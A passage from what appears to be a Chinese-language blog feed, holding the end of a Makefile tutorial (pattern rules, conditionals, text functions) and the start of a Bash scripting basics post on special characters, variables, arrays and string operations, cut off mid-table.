<div class="tabs" id="static-pattern-rules"><ul class="nav-tabs"><li class="tab active"><a href="#static-pattern-rules-1">basic</a></li><li class="tab"><a href="#static-pattern-rules-2">filter</a></li></ul><div class="tab-content"><div class="tab-pane active" id="static-pattern-rules-1"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line">objects = foo.o bar.o all.o</span><br><span class="line"><span class="section">all: <span class="variable">$(objects)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># These files compile via implicit rules</span></span><br><span class="line"><span class="variable">$(objects)</span>: %.o: %.c</span><br><span class="line"></span><br><span class="line"><span class="section">all.c:</span></span><br><span class="line">    echo <span class="string">&quot;int main() &#123; return 0; &#125;&quot;</span> &gt; all.c</span><br><span class="line"></span><br><span class="line"><span class="section">%.c:</span></span><br><span class="line">    touch <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.c *.o all</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="static-pattern-rules-2"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line">obj_files = foo.result bar.o lose.o</span><br><span class="line">src_files = foo.raw bar.c lose.c</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(obj_files)</span></span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">filter</span> %.o,<span class="variable">$(obj_files)</span>)</span>: %.o: %.c</span><br><span class="line">    echo <span class="string">&quot;target: <span class="variable">$@</span> prereq: <span class="variable">$&lt;</span>&quot;</span></span><br><span class="line"><span class="variable">$(<span class="built_in">filter</span> %.result,<span class="variable">$(obj_files)</span>)</span>: %.result: %.raw</span><br><span class="line">    echo <span class="string">&quot;target: <span class="variable">$@</span> prereq: <span class="variable">$&lt;</span>&quot;</span> </span><br><span class="line"></span><br><span class="line">%.c %.raw:</span><br><span class="line">    touch <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f <span class="variable">$(src_files)</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="定义匹配规则（Custom-Pattern）"><a href="#定义匹配规则（Custom-Pattern）" class="headerlink" title="定义匹配规则（Custom Pattern）"></a>定义匹配规则（Custom Pattern）</h2><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Define a pattern rule that compiles every .c file into a .o file</span></span><br><span class="line">%.o : %.c</span><br><span class="line">        <span class="variable">$(CC)</span> -c <span class="variable">$(CFLAGS)</span> <span class="variable">$(CPPFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure>

<h2 id="双冒号规则（Double-Colon）"><a href="#双冒号规则（Double-Colon）" class="headerlink" title="双冒号规则（Double-Colon）"></a>双冒号规则（Double-Colon）</h2><figure class="highlight make"><figcaption><span>Makefile</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="section">all: blah</span></span><br><span class="line"></span><br><span class="line"><span class="section">blah::</span></span><br><span class="line">    echo <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">blah::</span></span><br><span class="line">    echo <span class="string">&quot;hello again&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -f MakefileColon</span></figcaption><table><tr><td class="code"><pre><span class="line">hello</span><br><span class="line">hello again</span><br></pre></td></tr></table></figure>

<h1 id="条件（if-else）"><a href="#条件（if-else）" class="headerlink" title="条件（if-else）"></a>条件（if-else）</h1><div class="tabs" id="condition-if-else"><ul class="nav-tabs"><li class="tab active"><a href="#condition-if-else-1">var-is-defined</a></li><li class="tab"><a href="#condition-if-else-2">var-is-empty</a></li><li class="tab"><a href="#condition-if-else-3">findstring</a></li></ul><div class="tab-content"><div class="tab-pane active" id="condition-if-else-1"><figure class="highlight make"><figcaption><span>MakefileDefine</span></figcaption><table><tr><td class="code"><pre><span class="line">bar =</span><br><span class="line">foo = <span class="variable">$(bar)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line"><span class="keyword">ifdef</span> foo</span><br><span class="line">    echo <span class="string">&quot;foo is defined&quot;</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="keyword">ifndef</span> bar</span><br><span class="line">    echo <span class="string">&quot;but bar is not&quot;</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -s -f MakefileDefine</span></figcaption><table><tr><td class="code"><pre><span class="line">foo is defined</span><br><span class="line">but bar is not</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="condition-if-else-2"><figure class="highlight make"><figcaption><span>MakefileEmpty</span></figcaption><table><tr><td class="code"><pre><span class="line">nullstring =</span><br><span class="line">foo = <span class="variable">$(nullstring)</span> <span class="comment"># end of line; there is a space here</span></span><br><span class="line">bar = ok</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    echo [<span class="variable">$(nullstring)</span>] [<span class="variable">$(foo)</span>] [<span class="variable">$(bar)</span>]</span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(<span class="built_in">strip</span> <span class="variable">$(foo)</span>)</span>,)</span><br><span class="line">    echo <span class="string">&quot;foo is empty after being stripped&quot;</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(nullstring)</span>,)</span><br><span class="line">    echo <span class="string">&quot;nullstring doesn&#x27;t even have spaces&quot;</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(foo)</span>, ok)</span><br><span class="line">    echo <span class="string">&quot;foo equals ok&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    echo <span class="string">&quot;nope&quot;</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -s -f MakefileEmpty</span></figcaption><table><tr><td class="code"><pre><span class="line">[] [ ] [ok]</span><br><span class="line">foo is empty after being stripped</span><br><span class="line">nullstring doesn&#x27;t even have spaces</span><br><span class="line">nope</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="condition-if-else-3"><figure class="highlight make"><figcaption><span>MakefileFlags</span></figcaption><table><tr><td class="code"><pre><span class="line">bar =</span><br><span class="line">foo = <span class="variable">$(bar)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line"><span class="comment"># Search for the &quot;-i&quot; flag in MAKEFLAGS.</span></span><br><span class="line"><span class="keyword">ifneq</span> (,<span class="variable">$(<span class="built_in">findstring</span> i, <span class="variable">$(MAKEFLAGS)</span>)</span>)</span><br><span class="line">    echo <span class="string">&quot;i was passed to MAKEFLAGS&quot;</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -s -i -f MakefileFlags</span></figcaption><table><tr><td class="code"><pre><span class="line">i was passed to MAKEFLAGS</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h1><p><a href="https://www.gnu.org/software/make/manual/html_node/Functions.html">8 Functions for Transforming Text</a></p>
<div class="tabs" id="function-text"><ul class="nav-tabs"><li class="tab active"><a href="#function-text-1">subst</a></li><li class="tab"><a href="#function-text-2">patsubst</a></li><li class="tab"><a href="#function-text-3">if</a></li><li class="tab"><a href="#function-text-4">foreach</a></li><li class="tab"><a href="#function-text-5">call</a></li><li class="tab"><a href="#function-text-6">shell</a></li></ul><div class="tab-content"><div class="tab-pane active" id="function-text-1"><figure class="highlight make"><figcaption><span>MakefileSubst</span></figcaption><table><tr><td class="code"><pre><span class="line">comma := ,</span><br><span class="line">empty :=</span><br><span class="line">space := <span class="variable">$(empty)</span> <span class="variable">$(empty)</span></span><br><span class="line">foo := a b c</span><br><span class="line">bar := <span class="variable">$(<span class="built_in">subst</span> <span class="variable">$(space)</span>,<span class="variable">$(comma)</span>,<span class="variable">$(foo)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    @echo [<span class="variable">$(bar)</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -f MakefileSubst</span></figcaption><table><tr><td class="code"><pre><span class="line">[a,b,c]</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="function-text-2"><figure class="highlight make"><figcaption><span>MakefilePatsubst</span></figcaption><table><tr><td class="code"><pre><span class="line">foo := a.o b.o l.a c.o</span><br><span class="line">one := <span class="variable">$(<span class="built_in">patsubst</span> %.o,%.c,<span class="variable">$(foo)</span>)</span></span><br><span class="line"><span class="comment"># This is a shorthand for the above</span></span><br><span class="line">two := $(foo:%.o=%.c)</span><br><span class="line"><span class="comment"># This is the suffix-only shorthand, and is also equivalent to the above.</span></span><br><span class="line">three := $(foo:.o=.c)</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    echo <span class="variable">$(one)</span></span><br><span class="line">    echo <span class="variable">$(two)</span></span><br><span class="line">    echo <span class="variable">$(three)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -s -f MakefilePatsubst</span></figcaption><table><tr><td class="code"><pre><span class="line">a.c b.c l.a c.c</span><br><span class="line">a.c b.c l.a c.c</span><br><span class="line">a.c b.c l.a c.c</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="function-text-3"><figure class="highlight make"><figcaption><span>MakefileIf</span></figcaption><table><tr><td class="code"><pre><span class="line">foo := <span class="variable">$(<span class="built_in">if</span> this-is-not-empty,then!,else!)</span></span><br><span class="line">empty :=</span><br><span class="line">bar := <span class="variable">$(<span class="built_in">if</span> <span class="variable">$(empty)</span>,then!,else!)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    @echo <span class="variable">$(foo)</span></span><br><span class="line">    @echo <span class="variable">$(bar)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -s -f MakefileIf</span></figcaption><table><tr><td class="code"><pre><span class="line">then!</span><br><span class="line"><span class="keyword">else</span>!</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="function-text-4"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line">foo := who are you</span><br><span class="line"><span class="comment"># For each &quot;word&quot; in foo, output that same word with an exclamation after</span></span><br><span class="line">bar := <span class="variable">$(<span class="built_in">foreach</span> wrd,<span class="variable">$(foo)</span>,<span class="variable">$(wrd)</span>!)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="comment"># Output is &quot;who! are! you!&quot;</span></span><br><span class="line">    @echo <span class="variable">$(bar)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="function-text-5"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line">sweet_new_fn = Variable Name: $(0) First: $(1) Second: $(2) Empty Variable: $(3)</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="comment"># Outputs &quot;Variable Name: sweet_new_fn First: go Second: tigers Empty Variable:&quot;</span></span><br><span class="line">    @echo <span class="variable">$(<span class="built_in">call</span> sweet_new_fn, go, tigers)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="function-text-6"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="section">all:</span></span><br><span class="line">    @echo <span class="variable">$(<span class="built_in">shell</span> ls -la)</span> <span class="comment"># Very ugly because the newlines are gone!</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://www.gnu.org/software/make/manual/html_node/">GNU make manual</a><br>[2] <a href="https://makefiletutorial.com/">Learn Makefiles With the tastiest examples</a><br>[3] <a href="https://spin.atomicobject.com/2016/08/26/makefile-c-projects/">A Super-Simple Makefile for Medium-Sized C&#x2F;C++ Projects</a></p>
]]></content>
      <categories>
        <category>Automate</category>
        <category>make</category>
      </categories>
      <tags>
        <tag>Makefile</tag>
      </tags>
  </entry>
  <entry>
    <title>Bash脚本</title>
    <url>/ProgrammingLanguage/Bash/Basic.html</url>
    <content><![CDATA[<p>Bash脚本基本语法.</p>
<span id="more"></span>

<h1 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h1><h2 id="控制字符"><a href="#控制字符" class="headerlink" title="控制字符"></a>控制字符</h2><ul>
<li>以<code>Control + key</code>组合方式表示</li>
</ul>
<table>
<thead>
<tr>
<th align="left">按键</th>
<th align="left">含义</th>
<th align="left">八进制</th>
<th align="left">十六进制</th>
</tr>
</thead>
<tbody><tr>
<td align="left">A</td>
<td align="left">移到行首</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">E</td>
<td align="left">移到行尾</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">B</td>
<td align="left">左移一个字符</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">F</td>
<td align="left">右移一个字符</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">T</td>
<td align="left">颠倒光标下字符和左侧一个字符</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">D</td>
<td align="left">擦除光标下字符&#x2F;exit</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">H</td>
<td align="left">擦除光标左侧字符</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">W</td>
<td align="left">擦除光标左侧一个单词</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">K</td>
<td align="left">擦除光标字符到行尾</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">擦除光标字符到行首</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">J</td>
<td align="left">新行</td>
<td align="left">\012</td>
<td align="left">\x0a</td>
</tr>
<tr>
<td align="left">M</td>
<td align="left">回车符</td>
<td align="left">\015</td>
<td align="left">\x0d</td>
</tr>
<tr>
<td align="left">V</td>
<td align="left">允许插入控制字符，例如插入新行<code>&lt;Ctl-V&gt;&lt;Ctl-J&gt;</code></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">P</td>
<td align="left">切换历史命令</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">R</td>
<td align="left">搜索历史命令</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">C</td>
<td align="left">终止一个前台job</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Z</td>
<td align="left">暂停一个前台job</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Q</td>
<td align="left">恢复stdin</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">S</td>
<td align="left">冻结stdin</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">L</td>
<td align="left">清屏</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul>
<li>Bash自身只支持通配符（globbing），有两种标识：<code>*</code>和<code>?</code></li>
<li>Bash中执行的命令（grep、expr、sed、awk等）会支持正则表达式</li>
</ul>
<div class="tabs" id="bashglobbing"><ul class="nav-tabs"><li class="tab active"><a href="#bashglobbing-1">Globbing</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashglobbing-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> t?.sh</span><br><span class="line">t2.sh</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> [ab]*</span><br><span class="line">a.1</span><br><span class="line">b.1</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> [a-c]*</span><br><span class="line">a.1</span><br><span class="line">b.1</span><br><span class="line">c.1</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> [^ab]*</span><br><span class="line">c.1</span><br><span class="line">t2.sh</span><br><span class="line">test1.txt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> &#123;b*,c*,*est*&#125;</span><br><span class="line">b.1</span><br><span class="line">c.1</span><br><span class="line">test1.txt</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><ul>
<li>Bash的变量通常为字符串类型</li>
<li>当变量的值为只包含数字的字符串时，根据上下文情况也允许算术运算和比较操作</li>
</ul>
<h2 id="内建变量"><a href="#内建变量" class="headerlink" title="内建变量"></a>内建变量</h2><table>
<thead>
<tr>
<th align="left">变量名</th>
<th align="left">含义</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$BASH</td>
<td align="left">Bash程序路径</td>
<td align="left">&#x2F;bin&#x2F;bash</td>
</tr>
<tr>
<td align="left">$BASH_ENV</td>
<td align="left">调用脚本时执行的启动文件路径</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">$BASHPID</td>
<td align="left">当前实例的进程ID</td>
<td align="left">10293</td>
</tr>
<tr>
<td align="left">$CDPATH</td>
<td align="left">cd命令可用的搜索路径列表</td>
<td align="left">&#x2F;root&#x2F;.local&#x2F;share:&#x2F;opt</td>
</tr>
<tr>
<td align="left">$EDITOR</td>
<td align="left">脚本默认调用的编辑器</td>
<td align="left">vi</td>
</tr>
<tr>
<td align="left">$IFS</td>
<td align="left">内部字段分隔符（默认空白字符）</td>
<td align="left"><code>set x y z; IFS=&quot;-;&quot;; echo &quot;$*&quot;</code> -&gt; x-y-z</td>
</tr>
</tbody></table>
<h2 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h2><ul>
<li>参数变量用在脚本或函数的调用上</li>
</ul>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0 $1 $2 …</td>
<td align="left">参数的值，<code>$0</code>为脚本或函数名称，<code>$1</code>为第一个参数，…</td>
</tr>
<tr>
<td align="left">$#</td>
<td align="left">参数的数量（不含<code>$0</code>）</td>
</tr>
<tr>
<td align="left">$*</td>
<td align="left">所有位置参数（整体为一个字符串）</td>
</tr>
<tr>
<td align="left">$@</td>
<td align="left">所有位置参数（每个参数为一个字符串）</td>
</tr>
<tr>
<td align="left">$$</td>
<td align="left">脚本本身的进程ID</td>
</tr>
<tr>
<td align="left">$!</td>
<td align="left">最后一个后台运行job的进程ID</td>
</tr>
<tr>
<td align="left">$?</td>
<td align="left">命令或函数的退出状态</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">f</span></span>() &#123; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$#</span>:<span class="variable">$0</span>|<span class="variable">$1</span>|<span class="variable">$2</span>|<span class="variable">$3</span>:$*:<span class="variable">$@</span>&quot;</span> &#125;</span><br><span class="line">f 1 2 3 <span class="comment"># 3:f|1|2|3:1 2 3:1 2 3</span></span><br></pre></td></tr></table></figure>

<h2 id="声明类型"><a href="#声明类型" class="headerlink" title="声明类型"></a>声明类型</h2><ul>
<li><code>declare</code>或<code>typeset</code>允许修改变量的属性：readonly、integer、array、…</li>
</ul>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>declare -r va=1</code></td>
<td align="left">声明只读变量va</td>
</tr>
<tr>
<td align="left"><code>declare -i vb</code></td>
<td align="left">声明整型变量vb</td>
</tr>
<tr>
<td align="left"><code>declare -a vc</code></td>
<td align="left">声明数组变量vc</td>
</tr>
<tr>
<td align="left"><code>declare -x vd</code></td>
<td align="left">声明可在脚本外部使用的变量</td>
</tr>
<tr>
<td align="left"><code>declare -f [func_name]</code></td>
<td align="left">列出脚本中定义的函数（省略函数名时列出所有函数）</td>
</tr>
</tbody></table>
<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><ul>
<li>数组元素不需要是连续或邻近的，稀疏性质常常是有用的</li>
<li>数组中的元素可以是未初始化的，允许空白，从0开始索引</li>
</ul>
<div class="tabs" id="basharray"><ul class="nav-tabs"><li class="tab active"><a href="#basharray-1">General</a></li><li class="tab"><a href="#basharray-2">More</a></li></ul><div class="tab-content"><div class="tab-pane active" id="basharray-1"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># array A</span></span><br><span class="line">A[1]=11</span><br><span class="line">A[3]=33</span><br><span class="line">A[4]=`<span class="built_in">expr</span> <span class="variable">$&#123;A[1]&#125;</span> + <span class="variable">$&#123;A[3]&#125;</span>`</span><br><span class="line">A[5]=ee</span><br><span class="line">A[6]=`<span class="built_in">expr</span> <span class="variable">$&#123;A[1]&#125;</span> + <span class="variable">$&#123;A[5]&#125;</span>` <span class="comment"># (FAIL: add integer to string)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[1]&#125;</span>&quot;</span> <span class="comment"># 11</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[3]&#125;</span>&quot;</span> <span class="comment"># 33</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[4]&#125;</span>&quot;</span> <span class="comment"># 44</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[5]&#125;</span>&quot;</span> <span class="comment"># ee</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[6]&#125;</span>&quot;</span> <span class="comment"># (null variable)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[11]&#125;</span>&quot;</span> <span class="comment"># (null variable)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array B</span></span><br><span class="line">B=( zero one two three four )</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;B[0]&#125;</span>  <span class="comment"># zero (zero-based indexing)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;B[1]&#125;</span>  <span class="comment"># one</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[*]&#125;</span> <span class="comment"># 5 (number of elements)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[@]&#125;</span> <span class="comment"># 5 (number of elements)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[0]&#125;</span> <span class="comment"># 4 (length of first element)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[1]&#125;</span> <span class="comment"># 3 (length of second element)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;B[@]:1:2&#125;</span> <span class="comment"># one two (substring extraction)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array C</span></span><br><span class="line">C=([7]=seven [8]=eight)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;C[7]&#125;</span>&quot;</span> <span class="comment"># seven</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;C[8]&#125;</span>&quot;</span> <span class="comment"># eight</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array base64_charset</span></span><br><span class="line">base64_charset=( &#123;A..Z&#125; &#123;a..z&#125; &#123;0..9&#125; + / = )</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="basharray-2"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># concat</span></span><br><span class="line">A=(a b)</span><br><span class="line">B=(c d)</span><br><span class="line">C=(<span class="variable">$&#123;A[@]&#125;</span> <span class="variable">$&#123;B[@]&#125;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;C[@]&#125;</span> <span class="comment"># a b c d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># traversal</span></span><br><span class="line">A=(1 2 3 4 5)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;A[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$e</span> <span class="comment"># 1  2  3  4  5</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>$&#123; #A&#125;</code> <br> <code>expr length $A</code></td>
<td align="left">返回字符串长度，等同<code>c/strlen()</code> <br> 对于位置参数变量语法：<code>$&#123; #*&#125;</code>或<code>$&#123; #@&#125;</code> <br> 对于数组中元素数量语法：<code>$&#123; #array[*]&#125;</code>或<code>$&#123; #array[@]&#125;</code></td>
</tr>
<tr>
<td align="left"><code>expr match &quot;$A&quot; &#39;$b&#39;</code></td>
<td align="left">返回从字符串A开头匹配子字符串b的长度</td>
</tr>
<tr>
<td align="left"><code>expr index $A $b</code></td>
<td align="left">返回在字符串A中首次包含子字符串b的索引，等同<code>c/strchr()</code></td>
</tr>
<tr>
<td align="left"><code>$&#123;A:1:3&#125;</code> <br> <code>expr substr $A $1 $3</code></td>
<td align="left">返回子字符串（从position&#x3D;1开始的length&#x3D;3个字符）<br> 对于位置参数变量语法：<code>$&#123;*:2&#125;</code>或<code>$&#123;@:2&#125;</code></td>
</tr>
<tr>
<td align="left"><code>$&#123;A#b&#125;</code></td>
<td align="left">从A的首部删除最短匹配b的部分</td>
</tr>
<tr>
<td align="left"><code>$&#123;A##b&#125;</code></td>
<td align="left">从A的首部删除最长匹配b的部分</td>
</tr>
<tr>
<td align="left"><code>$&#123;A%b&#125;</code></td>
<td align="left">从A的尾部删除最短匹配b的部分</td>
</tr>
<tr>
<td align="left"><code>$&#123;A%%b&#125;</code></td>
<td align="left">从A的尾部删除最长匹配b的部分</td>
</tr>
<tr>
<td align="left"><code>$&#123;A/b/c&#125;</code></td>
<td align="left">替换A中第一个匹配b的部分为c</td>
</tr>
<tr>
<td align="left"><code>$&#123;A//b/c&#125;</code></td>
<td align="left">替换A中所有匹配b的部分为c</td>
</tr>
<tr>
<td align="left"><code>$&#123;A/#b/c&#125;</code></td>
<td align="left">替换A中首部匹配b的部分为c</td>
</tr>
<tr>
<td align="left"><code>$&#123;A/%b/c&#125;</code></td>
<td align="left">替换A中尾部匹配b的部分为c</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">S=a/b/c</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#S&#125;</span>       <span class="comment"># 5   (get length)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S:1:3&#125;</span>    <span class="comment"># /b/ (get substring)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S: -3:2&#125;</span>  <span class="comment"># b/  (get substring, 负数前需加空格)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S:(-3):2&#125;</span> <span class="comment"># b/  (get substring, 负数需加小括号)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S#a*/&#125;</span>    <span class="comment"># b/c (del substring, 从首部最短匹配，等同$&#123;S#*/&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S##a*/&#125;</span>   <span class="comment"># c   (del substring, 从首部最长匹配，等同$&#123;S##*/&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S%/*c&#125;</span>    <span class="comment"># a/b (del substring, 从尾部最短匹配，等同$&#123;S%/*&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S%%/*c&#125;</span>   <span class="comment"># a   (del substring, 从尾部最长匹配，等同$&#123;S%%/*&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/b/B&#125;</span>    <span class="comment"># a/B/c (replace substring, 替换从首部的第一个匹配)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/\//-&#125;</span>   <span class="comment"># a-b/c (replace substring, 正斜杠/需用反斜杠\进行转义)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S//\//-&#125;</span>  <span class="comment"># a-b-c (replace substring, 替换所有匹配)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/#a/A&#125;</span>   <span class="comment"># A/b/c (replace substring, 替换时限制从首部匹配)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/%c/C&#125;</span>   <span class="comment"># a/b/C (replace substring, 替换时限制从尾部匹配)</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> index <span class="variable">$S</span> /b/`          <span class="comment"># 2 (get index, 从1开始计算)</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> match <span class="variable">$S</span> <span class="string">&#x27;[ab/]*&#x27;</span>`     <span class="comment"># 4 (get length of match, 从首部匹配)</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> match <span class="variable">$S</span> <span class="string">&#x27;\([ab/]*\)&#x27;</span>` <span class="comment"># a/b/ (get substring, 从首部提取)</span></span><br></pre></td></tr></table></figure>

<h2 id="参数代换"><a href="#参数代换" class="headerlink" title="参数代换"></a>参数代换</h2><p>参数代换（parameter substitution）</p>
<table>
<thead>
<tr>
<th align="left">语句</th>
